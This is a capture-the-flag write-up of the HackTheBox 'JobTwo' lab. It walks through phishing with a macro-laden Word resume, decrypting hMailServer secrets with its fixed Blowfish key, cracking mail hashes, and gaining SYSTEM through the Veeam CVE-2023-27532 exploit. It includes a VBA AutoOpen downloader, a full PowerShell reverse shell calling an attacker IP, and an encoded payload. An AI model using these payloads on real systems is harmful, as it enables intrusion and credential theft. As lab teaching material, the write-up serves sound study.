---
icon: paw-simple
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 144729.png
coverY: 0
---

# HTB-JOBTWO(VL)

<figure><img src="../../../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

***

### Reconnaissance

#### Initial Port Scan

I started with Rustscan to identify all open ports on the target.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ rustscan -a 10.10.79.83 -- -sCV
```

**Results - 27 Open Ports:**

**Key Services:**

* **22/tcp** - SSH (OpenSSH for Windows 9.5)
* **25/tcp** - SMTP (hMailServer)
* **80/tcp** - HTTP (Microsoft HTTPAPI 2.0)
* **111/tcp** - RPCbind
* **135/tcp** - MSRPC
* **139/tcp** - NetBIOS-SSN
* **443/tcp** - HTTPS (Microsoft HTTPAPI 2.0)
* **445/tcp** - SMB
* **2049/tcp** - NFS
* **3389/tcp** - RDP (Microsoft Terminal Services)
* **5985/tcp** - WinRM
* Multiple high ports (6160-6290, 10001-10006, etc.)

**Findings:**

* Target is a **Windows standalone server** (not domain-joined)
* **TLS Certificate** reveals domains: **job2.vl** and **www.job2.vl**
* **hMailServer** running on port 25
* **NFS** service available
* All ports show TTL 127 (Windows one hop away)

#### Hosts File Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ echo "10.10.79.83 job2.vl www.job2.vl" | sudo tee -a /etc/hosts
```

***

### Enumeration

#### NFS (Port 2049)

Attempted to enumerate NFS shares but received timeout:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ showmount -e 10.10.79.83
clnt_create: RPC: Timed out
```

NFS appears to be configured but not accessible anonymously.

#### Web Application Analysis

**www.job2.vl (Port 80/443):**

The website is for a boat rental company looking for a captain. The page explicitly requests **resumes sent to hr@job2.vl as Word documents**.

**job2.vl (Port 80/443):**

Returns 404 - Not Found (default IIS page)

**Directory Brute Force:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ feroxbuster -u http://www.job2.vl
```

No interesting paths discovered - appears to be a static site with only `index.html`, `style.css`, and `bootstrap.min.css`.

***

### Initial Access - Malicious Word Document

#### Understanding the Attack Vector

The website requests resumes as **Microsoft Word documents** sent to **hr@job2.vl**. This is a classic phishing scenario where malicious macros in Word documents can achieve code execution.

#### Creating Malicious Resume

**On Windows VM:**

1. Opened Microsoft Word
2. Created a simple resume document
3. Pressed **Alt+F11** to open VBA Macro Editor
4. Created an `AutoOpen` macro (executes when document opens):

```vba
Sub AutoOpen()
    Shell "powershell -ep bypass -c ""iex(iwr http://10.10.14.41/shell.ps1 -usebasicparsing)"""
End Sub
```

**What this does:**

* **AutoOpen()** - Automatically executes when document is opened
* Downloads `shell.ps1` from attacker's web server
* Executes the PowerShell reverse shell

#### Preparing Payload

Created `shell.ps1` with PowerShell reverse shell from revshells.com:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ nano shell.ps1
[Paste reverse shell payload]

┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ python3 -m http.server 80
```

#### Sending Malicious Email

Used **swaks** to send the resume via SMTP:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ swaks --to hr@job2.vl --from sn0x@sn0x.com --header "Subject: Hire me!" --body "Please review my resume" --attach @resume.doc --server 10.10.79.83
```

**Important:** Used `@resume.doc` (with `@`) so bash passes file contents, not just filename.

#### Getting Shell as Julian

**Web server received request:**

```
10.10.79.83 - - [24/Jan/2026 08:32:08] "GET /shell.ps1 HTTP/1.1" 200 -
```

**Reverse shell received:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ rlwrap -cAr nc -lnvp 443
Connection received on 10.10.79.83 52550

PS C:\WINDOWS\system32> whoami
job2\julian
```

***

### Privilege Escalation to Ferdinand

#### Post-Exploitation Enumeration

**Users on system:**

```powershell
PS C:\> net user

User accounts for \\JOB2
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Ferdinand                
Guest                    Julian                   svc_veeam                
WDAGUtilityAccount
```

**Key finding:** **Ferdinand** is in Remote Management Users and Remote Desktop Users groups.

#### hMailServer Discovery

Found hMailServer installed:

```powershell
PS C:\Program Files (x86)\hMailServer> ls
```

**Configuration file location:**

```powershell
PS C:\Program Files (x86)\hMailServer\bin> cat hMailServer.INI
```

**Critical information found:**

```ini
[Security]
AdministratorPassword=8a53bc0c0c9733319e5ee28dedce038e

[Database]
Type=MSSQLCE
Username=
Password=4e9989caf04eaa5ef87fd1f853f08b62
PasswordEncryption=1
```

#### Decrypting Database Password

hMailServer encrypts passwords using **Blowfish** with key `"THIS_KEY_IS_NOT_SECRET"`.

**Method 1: CyberChef**

* Used Blowfish Decrypt with ECB mode
* Key: `THIS_KEY_IS_NOT_SECRET`
* Input (hex): `4e9989caf04eaa5ef87fd1f853f08b62`
* Required byte-swapping for endianness

**Method 2: Python Script**

Created decryption script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ nano hmail_decrypt.py
```

```python
#!/usr/bin/env python3
# /// script
# dependencies = ["pycryptodome"]
# ///
import sys, binascii, struct
from Crypto.Cipher import Blowfish

def swap_endianness(data):
    result = b''
    for i in range(0, len(data), 4):
        word = data[i:i+4]
        if len(word) == 4:
            result += word[::-1]
        else:
            result += word
    return result

key = b'THIS_KEY_IS_NOT_SECRET'
encrypted_hex = sys.argv[1]
encrypted = binascii.unhexlify(encrypted_hex)
encrypted_swapped = swap_endianness(encrypted)
cipher = Blowfish.new(key, Blowfish.MODE_ECB)
decrypted = cipher.decrypt(encrypted_swapped)
decrypted_swapped = swap_endianness(decrypted)

print(f"Decrypted: {decrypted_swapped.rstrip(b'\x00').decode('utf-8')}")
```

**Decrypting:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ uv run hmail_decrypt.py 4e9989caf04eaa5ef87fd1f853f08b62
Decrypted: 95C02068FD5D
```

**Database Password:** 95C02068FD5D

#### Accessing hMailServer Database

The database was locked (in use), so I created a copy and upgraded it:

```powershell
PS C:\> Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"

PS C:\> copy "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\

PS C:\> $engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=95C02068FD5D")

PS C:\> $engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
```

**Connecting to upgraded database:**

```powershell
PS C:\> $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\\Windows\\Temp\\hMailServerUpgraded.sdf;Password=95C02068FD5D")

PS C:\> $conn.Open()

PS C:\> $conn.State
Open
```

**Extracting credentials:**

```powershell
PS C:\> $cmd = $conn.CreateCommand()

PS C:\> $cmd.CommandText = "SELECT accountaddress, accountpassword FROM hm_accounts"

PS C:\> $reader = $cmd.ExecuteReader(); while ($reader.Read()) { $reader["accountaddress"], $reader["accountpassword"] -join ":" }; $reader.Close()
```

**Retrieved hashes:**

```
Julian@job2.vl:8981c81abda0acadf1d12dd9d213bac7c51c022a34268058af3757607075e0eb49f76f
Ferdinand@job2.vl:04063d4de2e5d06721cfbd7a31390d02d18941d392e86aabe02eda181d9702838baa11
hr@job2.vl:1a5adad158ccffd81db73db040c72109067add598fafc47bbbd92da9a69661af94f055
```

#### Cracking Hashes

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ hashcat hmail_hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

**Cracked:**

```
Ferdinand@job2.vl:Franzi123!
```

#### Accessing as Ferdinand

**WinRM Access:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ evil-winrm-py -i 10.10.79.83 -u Ferdinand -p 'Franzi123!'

evil-winrm-py PS C:\Users\Ferdinand\Documents>
```

**RDP Access (Alternative):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ xfreerdp /v:10.10.79.83 /u:ferdinand /p:'Franzi123!' /cert-ignore /dynamic-resolution
```

***

### Privilege Escalation to SYSTEM

#### Veeam Backup & Replication Discovery

**Desktop shortcut** for Veeam present on Ferdinand's desktop.

**Installation confirmed:**

```powershell
evil-winrm-py PS C:\Program Files\Veeam> ls
Backup and Replication
Backup File System VSS Integration
Veeam Distribution Service
```

**Veeam processes running:**

```powershell
evil-winrm-py PS C:\> ps | findstr Veeam
...
Veeam.Backup.Service
Veeam.Backup.Manager
VeeamDeploymentSvc
...
```

**Version identification:**

```powershell
evil-winrm-py PS C:\> [System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").FileVersion
10.0.1.4854
```

#### CVE-2023-27532 Exploitation

**Vulnerability Details:**

* **CVE-2023-27532** affects Veeam Backup & Replication < 11.0.1.1261
* Allows extraction of encrypted credentials from configuration database
* Service listens on **TCP 9401**

**Verifying service:**

```powershell
evil-winrm-py PS C:\> netstat -ano | findstr 9401
TCP    0.0.0.0:9401           0.0.0.0:0              LISTENING       3132
```

#### Downloading Exploit

Used compiled exploit from **puckiestyle's fork**:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ wget https://github.com/puckiestyle/CVE-2023-27532/releases/download/v1.0/VeeamHax.exe
```

**Required DLLs:**

* Veeam.Backup.Interaction.MountService.dll
* Veeam.Backup.Common.dll
* Veeam.Backup.Core.dll

#### Uploading Exploit

```powershell
evil-winrm-py PS C:\Users\Ferdinand\Desktop> upload VeeamHax.exe
evil-winrm-py PS C:\Users\Ferdinand\Desktop> upload Veeam.Backup.Interaction.MountService.dll
evil-winrm-py PS C:\Users\Ferdinand\Desktop> upload Veeam.Backup.Common.dll
evil-winrm-py PS C:\Users\Ferdinand\Desktop> upload Veeam.Backup.Core.dll
```

#### Executing Reverse Shell

**Prepared Base64-encoded PowerShell reverse shell:**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.41",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

**Encoded to Base64:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ echo -n '<powershell_payload>' | iconv -t utf-16le | base64 -w0
```

**Executing exploit:**

```powershell
evil-winrm-py PS C:\Users\Ferdinand\Desktop> .\VeeamHax.exe --cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANABFACEAIAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANUEB8AewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

Targeting 127.0.0.1:9401
```

#### SYSTEM Shell Received

```bash
┌──(sn0x㉿sn0x)-[~/HTB/JobTwo]
└─$ rlwrap -cAr nc -lvnp 443
Connection received on 10.10.79.83 53492

PS C:\WINDOWS\system32> whoami
nt authority\system
```

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
